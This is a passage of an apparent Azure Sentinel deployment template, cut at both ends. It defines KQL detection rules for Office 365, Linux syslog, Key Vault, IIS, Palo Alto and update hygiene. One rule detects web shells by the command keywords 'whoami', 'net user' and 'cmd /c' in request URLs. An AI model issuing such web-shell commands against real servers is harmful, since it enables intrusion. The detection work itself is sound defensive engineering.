          "query": "let start_time = 1h;\nlet latency = 0m;\nlet alert_bin = 1h;\nlet end_time = now();\nOfficeActivity\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time) \n| where OfficeWorkload == 'OneDrive' and SourceFileExtension == 'mp4' and SourceRelativeUrl == 'Documents/Recordings'\n| where Operation == 'FileUploaded'\n| extend \n    bv_src_user = tolower(UserId)\n    , bv_change_action = tolower(Operation)\n    , bv_object = extract(@\"~tmp.*?_(.*)\",1,SourceFileName)\n    , bv_src_ip = ClientIP\n| mv-apply e = BV11090_CONFIGURATION['EXCLUSION'] on (\n        extend keys = bag_keys(e)\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n        | extend bv_object_excluded = iff(bv_object contains e.bv_object and isnotempty(e.bv_object), 1, 0)\n        | extend bv_src_ip_excluded = iff(bv_src_ip contains e.bv_src_ip and isnotempty(e.bv_src_ip), 1, 0)\n        | extend excluded_count = \n                bv_src_user_excluded\n                + bv_object_excluded\n                + bv_src_ip_excluded\n        | extend transparent = iff(isnotempty(e.metadata[\"transparent\"]), e.metadata[\"transparent\"], true) \n        | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n        | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n        | summarize excluded=make_set(excluded), transparent=countif(transparent), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| where ExcludedEvent == false or not(ExcludedEvent == true and transparent == 0)\n| where not(ExcludedEvent)\n| summarize \n      bv_start_time = min(TimeGenerated)\n      , bv_end_time   = max(TimeGenerated)\n      , bv_event_count = count()\n      , bv_change_action = make_set(bv_change_action)\n      , bv_src_ip = make_set(bv_src_ip)\n      , bv_object = make_set(bv_object)\n    by \n      bv_src_user\n| extend VictimEntity = pack_array(bv_src_user)\n| extend AttackerEntity = pack_array(bv_src_user)\n| extend ExtendedDescription = strcat(\n      'bv_src_user:', bv_src_user\n      , '\\nbv_change_action: \\n* ', strcat_array(bv_change_action, '\\n* ')            \n      , '\\nbv_object: \\n* ', strcat_array(bv_object, '\\n* ')\n      , '\\nbv_src_ip: \\n* ', strcat_array(bv_src_ip, '\\n* ')                         \n)\n| extend bv_rule_version = '1.0.4156'\n| extend bv_rule_timestamp = '1695822648.7833426'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4156 bv_rule_timestamp: 1695822648.7833426'\n| project   \n      bv_start_time\n      , bv_end_time\n      , bv_src_user\n      , bv_event_count\n      , bv_change_action\n      , bv_object\n      , bv_src_ip\n      , ExtendedDescription\n      , VictimEntity\n      , AttackerEntity\n      , bv_rule_combined_string\n      , RBAScore = BV11090_CONFIGURATION['RBASCORE']",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1125"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies any recorded meetings by users via Office 365 logs\n\n{{ExtendedDescription}}\n\ntag: Custom\nCategory: Office 365\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-133')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-133')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-133: [Hygiene] O365 - Rare and potentially high-risk Operations",
          "description": "Identifies Office operations that are typically rare and can provide capabilities useful to attackers. MITRE: T1580 Category: Office 365 tag: Hygiene",
          "severity": "Medium",
          "enabled": false,
          "query": "let ingested_lookback = 1d; // earliest [ingest time] boundary\nlet generated_lookback = 2d; // earliest [log time] boundary\nlet alert_bin = 24h;\nOfficeActivity\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where tolower(UserId) matches regex tolower(MICROSOFT_OFFICE_OPERATIONS_ACCOUNTS) == false\n| extend SrcAddress = iff(isempty(ClientIP), Client_IPAddress, ClientIP)\n| where Operation in~ (A133_INCLUDED_OPERATIONS)\n| summarize FirstEventTIme=min(TimeGenerated), LastEventTime=max(TimeGenerated), Operations=make_set(pack('RecordType', RecordType, 'Operation', Operation),5) by SrcAddress, UserId, bin(TimeGenerated,alert_bin)\n| parse UserId with UserName '@' UserDomain\n| project FirstEventTIme, LastEventTime, Operations, SrcAddress, UserId, UserName, UserDomain",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery"
          ],
          "techniques": [
            "T1580"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcAddress"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "UserDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-124')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-124')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-124: [Hygiene] Linux - Error-Critical-Emergency-Alert Messages",
          "description": "This weekly report identifies syslog messages with any of error, critical, emergency or alert severity level. Runs on Friday. MITRE: T1204 Category: Linux tag: Hygiene",
          "severity": "Informational",
          "enabled": false,
          "query": "Syslog\n| where TimeGenerated >= ago(7d)\n| where SeverityLevel in~ ('err', 'crit', 'emerg', 'alert')\n| extend HostCustomEntity = iff(HostName =~ 'Unknown IP', HostIP, HostName)\n| extend NumDays = dayofweek(now(TIME_DIFF))\n| extend TriggerDate = toint(format_timespan(NumDays, 'd'))\n| where TriggerDate == 5\n| summarize\n    Count=count(),\n    First=min(TimeGenerated),\n    Last=max(TimeGenerated),\n    SyslogMessages=make_set(SyslogMessage, MaxSet=5)\n    by HostCustomEntity, bin(TimeGenerated, 7d)\n| sort by Count desc",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1204"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-275')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-275')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-275: [Hygiene] Linux - Excessive Authentication Failures",
          "description": "This alert identifies login failures to a Linux system every hour based where the failed login count is greater than a set threshold, indicating a potential brute force attempt MITRE: T1187,T1110 Category: Linux tag: Hygiene",
          "severity": "Low",
          "enabled": false,
          "query": "let time_window = 1d;\nSyslog\n| where TimeGenerated >= ago(time_window)\n| where SyslogMessage startswith 'pam'\n| extend Module = extract('^pam_\\\\w*\\\\((.*)\\\\):', 1, SyslogMessage)\n| extend Status = case(SyslogMessage has 'denied','denied',SyslogMessage has 'success','success',SyslogMessage has 'failed','failed','')\n| extend Success = iff(Status=~'denied',false,true)\n| where Success == false\n| extend AccountCustomEntity = extract(' user=(\\\\S+)', 1, SyslogMessage)\n| extend AccountCustomEntity = iif(isempty( AccountCustomEntity),extract(' user (\\\\S+):', 1, SyslogMessage),AccountCustomEntity)\n//Remove bracket\n| extend AccountName = replace(@'(\\[).*(\\])',@'\\0',AccountCustomEntity)\n| where notempty(AccountName)\n| extend Source = extract(' rhost=(\\\\S+)', 1, SyslogMessage)\n| extend Source = iff(Source has 'unknown', '', Source)\n| extend SourceIP = iff(isnull(parse_ipv4(Source)), '', Source)\n| extend ExemptIP = iff(SourceIP in (A275_EXCLUSION_IP),true,false)\n| extend ExemptHost = iff(Computer in (A275_EXCLUSION_HOST),true,false)\n| extend ExemptAccount = iff(AccountName in (A275_EXCLUSION_ACCOUNT),true,false)\n| where not(ExemptIP or ExemptHost or ExemptAccount)\n|summarize FirstTime=min(TimeGenerated), LastTime=max(TimeGenerated), EventCount=count(), SourceIPCount=dcount(SourceIP), SourceIP=make_set(SourceIP), ItemIds=make_set(_ItemId, MaxSize=5), Events=make_set(SyslogMessage, MaxSize=5), HostCount=dcount(Computer), Hosts=make_set(Computer) by AccountName, bin(TimeGenerated, time_window)\n| extend Hosts = tostring(Hosts), SourceIP=tostring(SourceIP), ItemIds=tostring(ItemIds)\n| where EventCount > A275_ACCOUNT_LOCKOUT_THRESHOLD\n| extend SourceHost1 = tostring(parse_json(Hosts)[0])\n| extend SourceHost2 = tostring(parse_json(Hosts)[1])\n| extend SourceIP1 = tostring(parse_json(SourceIP)[0])\n| extend SourceIP2 = tostring(parse_json(SourceIP)[1])\n| extend TargetUser = AccountName\n| extend LogSourceHost = tostring(parse_json(Hosts)[0])   \n| extend Tags = 'tag: RBA'    \n| extend Description = 'This alert identifies login failures to a Linux system every hour based where the failed login count is greater than a set threshold, indicating a potential brute force attempt'\n| extend Description = strcat(Description, ' MITRE: T1187 MITRE: T1110 ', Tags)    \n| extend SystemAlertPlatform = 'Correlation'",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1187",
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "TimeGenerated": "TimeGenerated",
            "ItemId": "ItemIds",
            "TargetHost": "LogSourceHost",
            "LogSourceHost": "LogSourceHost",
            "TargetUser": "TargetUser",
            "SystemAlertPlatform": "SystemAlertPlatform",
            "Details": "Description"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "TargetUser"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP1"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP2"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "SourceHost1"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "SourceHost2"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-106')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-106')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-106: [RBA] Azure KeyVault - Sensitive Operations",
          "description": "Identifies when sensitive Azure Key Vault operations are used. This includes: VaultDelete, KeyDelete, KeyDecrypt, SecretDelete, SecretPurge, KeyPurge, SecretBackup, KeyBackup.  Any Backup operations should match with expected scheduled backup activity. MITRE: T1555 Category: Azure Key Vault tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "let timeframe = 1d;\nlet SensitiveOperationList = dynamic(\n['VaultDelete', 'KeyDelete', 'SecretDelete', 'SecretPurge', 'KeyPurge', 'SecretBackup', 'KeyBackup']);\nAzureDiagnostics\n| where TimeGenerated > ago(timeframe)\n| extend ResultType = columnifexists('ResultType', 'NoResultType')\n| extend requestUri_s = columnifexists('requestUri_s', 'None'), identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g = columnifexists('identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g', 'None')\n| extend id_s = columnifexists('id_s', 'None'), CallerIPAddress = columnifexists('CallerIPAddress', 'None'), clientInfo_s = columnifexists('clientInfo_s', 'None')\n| where ResultType !~ 'None' and isnotempty(ResultType)\n| where identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g !~ 'None' and isnotempty(identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g)\n| where id_s !~ 'None' and isnotempty(id_s)\n| where CallerIPAddress !~ 'None' and isnotempty(CallerIPAddress)\n| where clientInfo_s !~ 'None' and isnotempty(clientInfo_s)\n| where requestUri_s !~ 'None' and isnotempty(requestUri_s)\n| where ResourceType =~ 'VAULTS' and ResultType =~ 'Success' \n| where OperationName in~ (SensitiveOperationList)  \n| summarize EventCount=count(), StartTimeUtc=min(TimeGenerated), EndTimeUtc=max(TimeGenerated), TimeTriggered=makelist(TimeGenerated),OperationNameList=make_set(OperationName), RequestURLList=make_set(requestUri_s), CallerIPList = make_set(CallerIPAddress),  CallerIPMax= arg_max(CallerIPAddress,*) by ResourceType, ResultType, Resource, id_s, identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g, clientInfo_s\n| extend timestamp = StartTimeUtc, IPCustomEntity = CallerIPMax, AccountCustomEntity = identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1555"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-239')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-239')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-239: [RBA] IIS - Web shell script detected and replied OK",
          "description": "Web shells are script that when uploaded to a web server can be used for remote administration. Attackers often use web shells to obtain unauthorized access, escalate //privilege as well as further compromise the environment. The query detects web shells that use GET requests by keyword searches in URL strings. The response from website is in 200 range, meaning the code is accepted. This alert is based out of sigma rules described //here (https://github.com/Neo23x0/sigma/blob/master/rules/web/web_webshell_keyword.yml). There could be some web sites like wikis with articles on os commands and pages that include the os //commands in the URLs that might cause FP. MITRE: T1505 Category: IIS tag: RBA",
          "severity": "Medium",
          "enabled": false,
          "query": "W3CIISLog\n| where TimeGenerated >= ago(1h)\n| where csMethod == 'GET' \n| where ( csUriQuery has 'whoami' or csUriQuery contains 'net%20user' or csUriQuery contains 'cmd%20/c%20' ) or \n        ( csUriStem has 'whoami' or csUriStem contains 'net%20user' or csUriStem contains 'cmd%20/c%20' ) or\n        ( csReferer has 'whoami' or csReferer contains 'net%20user' or csReferer contains 'cmd%20/c%20' )\n| summarize StartTimeUtc = max(TimeGenerated), EndTimeUtc = min(TimeGenerated), ConnectionCount = count() \nby Computer, sSiteName, sIP, cIP, csUserName, csUriQuery, csMethod, scStatus, scSubStatus, scWin32Status\n| where scStatus startswith '2'\n| extend timestamp = StartTimeUtc, IPCustomEntity = cIP, HostCustomEntity = Computer, AccountCustomEntity = csUserName",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1505"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-087')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-087')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-087: [RBA] Palo Alto - Anomalous Number of Denial Messages",
          "description": "This alert identifies outliers in the number of PaloAltoNetworks denials recorded in the CommonSecurityLog used by devices recording their logs in Common Event Format (CEF). MITRE: T1567 Category: PaloAltoNetworks tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "//build a baseline from the past n days before today\nlet timeRange = 14d;\nlet MaxIPDenyEventCountsPerDay = \nCommonSecurityLog\n| where TimeGenerated between(ago(timeRange)..ago(1d))\n| where DeviceVendor =~ 'Palo Alto Networks'\n| where DeviceProduct =~ 'PAN-OS'\n| where DeviceAction =~ 'deny'\n|summarize EventCount=count() by SourceIP,bin(TimeGenerated,1d)\n//get n%tile and Max\n|summarize percentiles(EventCount,90), max(EventCount) by SourceIP\n//add the difference of them to the max of the baseline for this IP\n|extend GreaterThanThis = (max_EventCount - percentile_EventCount_90) + max_EventCount\n;\nCommonSecurityLog\n//compare today to the past n days.\n| where TimeGenerated between(ago(1d)..now())\n| where DeviceVendor =~ 'Palo Alto Networks'\n| where DeviceProduct =~ 'PAN-OS'\n| where DeviceAction =~ 'deny'\n| where SourceIP !in (WHITELISTED_SCANNERS)\n| summarize First=min(TimeGenerated), Last=max(TimeGenerated),EventCount=count() by SourceIP\n| join MaxIPDenyEventCountsPerDay on SourceIP\n//today is greater than the max plus the difference of n%tile.\n| where EventCount > GreaterThanThis\n|project SourceIP,First,Last,EventCount,GreaterThanThis",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration"
          ],
          "techniques": [
            "T1567"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-041')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-041')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-041: [RBA] O365 - External Teams users from anomalous organizations",
          "description": "This alert identifies Teams users from newly seen organizations. MITRE: T1213 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "let data_date = 14d;\nlet known_orgs = materialize(\n    OfficeActivity\n    | where TimeGenerated between (ago(data_date) .. ago(1d))\n    | where OfficeWorkload =~ 'MicrosoftTeams'\n    | project TimeGenerated, Operation, UserId, Members\n    | where Operation =~ 'MemberAdded' or Operation =~ 'TeamsSessionStarted'\n    | extend UPN = iif(Operation =~ 'MemberAdded', tostring(parse_json(Members)[0].UPN), UserId)\n    | extend Organization = tostring(split(UPN, '@')[1])\n    | where isnotempty(Organization)\n    | summarize by Organization);\nlet CountKnownOrgs = (known_orgs\n    | summarize count());\nOfficeActivity\n| where TimeGenerated between( ago(1d) .. now())\n| where ingestion_time() > ago(1d)\n| where OfficeWorkload =~ 'MicrosoftTeams' and TeamName !in~ (A041_WL_TEAMNAMES)\n| project TimeGenerated, Operation, TeamName, UserId, Members\n| where Operation =~ 'MemberAdded' or Operation =~ 'TeamsSessionStarted'\n| extend UPN = iif(Operation == 'MemberAdded', tostring(parse_json(Members)[0].UPN), UserId)\n| parse UPN with UserName '@' UserDomain\n| where isnotempty(UserDomain)\n| where toscalar(CountKnownOrgs) > 0\n| where UserDomain !in~ (known_orgs)\n| extend Event = pack('TimeGenerated', TimeGenerated, 'TargetAccount', UPN, 'Details', pack('TeamName', TeamName, 'Operation', Operation))\n| project TimeGenerated, Event, UPN, UserName, UserDomain, Members, Operation, TeamName",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1213"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "Event": "Event"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "UserDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-038')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-038')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-038: [Hygiene] ASC Updates - Missing Critical Updates",
          "description": "This alert identifies critical updates that are missing from computers monitored through Azure Security Center. MITRE: T1068,T1190,T1212,T1211 Category: Azure Security Center Updates tag: Hygiene",
          "severity": "Informational",
          "enabled": false,
          "query": "let start_time = 14d;\nlet end_time = now();\n            Update\n            | where TimeGenerated between (ago(start_time) .. end_time) and ingestion_time() > ago(start_time)\n            | where UpdateState =~ 'Needed' \n            | where MSRCSeverity =~ 'Critical'\n            | extend Computer_Name = extract(@'^([A-Za-z0-9\\-\\_]+)', 1, toupper(Computer))\n            | extend MissingUpdate = strcat(MSRCSeverity, ' - ', Product, ' - ',Title)\n            | summarize First=min(TimeGenerated),Last=max(TimeGenerated), MissingUpdates=make_set(MissingUpdate) by Computer_Name\n            | where Last between (ago(1d)..now())\n            | extend MissingUpdates = tostring(MissingUpdates)\n            | extend HostCustomEntity = Computer_Name\n            | project-away Computer_Name\n            | extend Days = datetime_diff('Day',now(),First)\n            | extend Days = iif(Days==0,1,Days)\n            | extend Severity = case(Days >= 10, 'High',  Days >= 3, 'Medium', 'Low')\n            | extend ExtendedDescription = strcat('Host ', HostCustomEntity,' has been in need of critical updates for ',iif(Days==14,' at least ',''), tostring(Days), ' days.')\n            | extend VictimEntity = HostCustomEntity\n            | project ExtendedDescription, HostCustomEntity, Days, Severity, MissingUpdates, First, Last, VictimEntity",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "DefenseEvasion",
            "PrivilegeEscalation",
            "InitialAccess"
          ],
          "techniques": [
            "T1068",
            "T1190",
            "T1212",
            "T1211"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies critical updates that are missing from computers monitored through Azure Security Center.\n{{ExtendedDescription}}\ntag: Hygiene\nCategory: Azure Security Center Updates\nMITRE: T1068, T1190, T1211, T1212",
            "alertSeverityColumnName": "Severity"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "MissingUpdates": "MissingUpdates"
          },
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-081')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-081')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-081: [RBA] O365 - Powershell mailbox login activity",
